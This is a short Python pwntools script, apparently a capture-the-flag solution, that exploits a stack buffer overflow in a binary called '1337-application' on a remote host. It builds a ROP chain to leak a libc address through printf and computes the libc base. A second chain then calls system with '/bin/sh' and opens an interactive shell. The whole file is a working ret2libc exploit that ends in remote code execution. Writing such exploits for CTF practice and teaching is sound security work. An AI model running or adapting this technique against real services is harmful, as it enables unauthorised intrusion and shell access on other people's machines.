from pwn import *

context.update(arch='i386', os='linux')
context.terminal = ["termite", "-e"]

elf = ELF("../bin/1337-application")

p = remote("1337b01s.duckdns.org",2525)

rop = ROP(elf)
libc_function = "__libc_start_main"
rop.call(elf.symbols["printf"], [elf.got[libc_function]])
rop.call(elf.symbols["vuln"], [elf.symbols["buf"]])

padding = cyclic(cyclic_find(0x63616164))
payload = padding + rop.chain()

p.sendline(payload)

p.recvuntil("\n")
p.recvuntil("\n")

raw_leak = p.recv(4)
leaked_addr = u32(raw_leak.ljust(4, b"\x00"))
log.info("%s found at 0x%08x from address 0x%08x" % (libc_function, leaked_addr, elf.got[libc_function]))

libc = ELF("../bin/libc6-i386_2.23-0ubuntu11.2_amd64.so")

libc.address = leaked_addr - libc.symbols[libc_function]

print(next(libc.search(b"/bin/sh\x00")))

log.info("libc base address is at 0x%08x" % libc.address)

rop = ROP(libc)
rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])
rop.call(libc.symbols["exit"])

payload = padding + rop.chain()

p.sendline(payload)
p.recv()

p.interactive()
